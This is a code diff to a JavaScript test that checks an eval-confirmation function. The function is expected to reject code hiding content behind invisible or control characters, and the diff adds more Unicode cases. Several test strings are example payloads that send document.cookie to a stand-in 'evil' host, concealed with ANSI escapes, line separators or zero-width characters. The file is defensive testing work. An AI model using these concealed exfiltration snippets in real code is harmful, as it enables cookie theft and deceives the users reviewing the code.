@@ -126,7 +126,8 @@ test("eval shows its code, host, and line count and runs only when the run optio
 test("eval refuses code that could hide part of itself from the prompt", async () => {
   const choose = async () => { throw new Error("should not ask"); };
   for (const code of ["document.title\u001b[8m;fetch('//evil/?'+document.cookie)\u001b[0m", "fetch('//evil')\rdocument.title", "a\u0085b", "x\u202e)(lave",
-    "// cleanup\u2028fetch('//evil?'+document.cookie)", "// cleanup\u2029fetch('//evil')", "a\u061cb", "a\u200bb", "a\u200db", "a\u2060b", "\ufeffdocument.title"]) {
+    "// cleanup\u2028fetch('//evil?'+document.cookie)", "// cleanup\u2029fetch('//evil')", "a\u061cb", "a\u200bb", "a\u200db", "a\u2060b", "\ufeffdocument.title",
+    "const a\ufe00 = 'evil'; const a = 'ok'; a\ufe00", "const \u3164 = 1", "a\uffa0b", "a\u115fb", "a\u00adb", "a\u034fb", "a\u180eb", "a\u{e0041}b"]) {
     await assert.rejects(confirmEval(code, "example.com", choose), /invisible or control characters/);
   }
   await assert.rejects(confirmEval(`fetch('//evil')${"\na;".repeat(20)}`, "example.com", choose), /limited to 20 lines/);
